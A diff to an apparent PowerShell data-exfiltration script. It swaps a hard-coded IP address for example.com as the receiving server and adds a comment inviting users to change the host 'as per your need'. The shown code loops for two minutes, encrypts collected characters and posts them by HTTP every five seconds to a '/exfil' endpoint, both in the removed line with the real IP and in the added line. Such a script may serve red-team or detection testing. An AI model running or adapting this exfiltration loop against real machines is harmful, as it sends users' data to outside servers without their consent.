@@ -1,5 +1,6 @@
 #--------------------------------------------------------------
 # Exfil of data using common channel like HTTP over port "80"
+# Using "example.com" as exfile server, change as per your need.
 #--------------------------------------------------------------
 
 $timeout = new-timespan -Minutes 2
@@ -14,7 +15,7 @@ while ($sw.elapsed -lt $timeout){
 			$secureString.AppendChar($char)
 		}
 		$encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key $key
-		Invoke-WebRequest -Uri http://188.166.212.120/exfil -Method POST -Body $encryptedData > $null 2>&1
+		Invoke-WebRequest -Uri http://example.com/exfil -Method POST -Body $encryptedData > $null 2>&1
         }
     start-sleep -seconds 5
 }
